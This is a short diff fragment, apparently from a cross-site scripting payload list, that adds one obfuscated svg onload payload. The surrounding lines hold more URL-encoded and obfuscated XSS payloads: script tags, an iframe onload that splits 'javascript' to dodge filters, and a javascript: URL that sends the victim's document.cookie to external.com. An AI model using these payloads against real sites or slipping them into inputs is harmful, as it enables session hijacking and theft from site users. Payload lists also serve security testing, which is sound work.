@@ -215,3 +215,4 @@ javascript%3Alocation%2f**%2f=%27https://external.com/?%27%2bdocument.cookie
 '%3e%3cscript%3ealert(5*5)%3c%2fscript%3eejj4sbx5w4o
 %3Cscript%3Ealert()%3C/script%3E
 <iframe/onload​='this["src"]="javas&Tab;cript​:al"+"ert``"';>
+<!--><svg+onload=%27top[%2fal%2f%2esource%2b%2fert%2f%2esource](origin)%27>
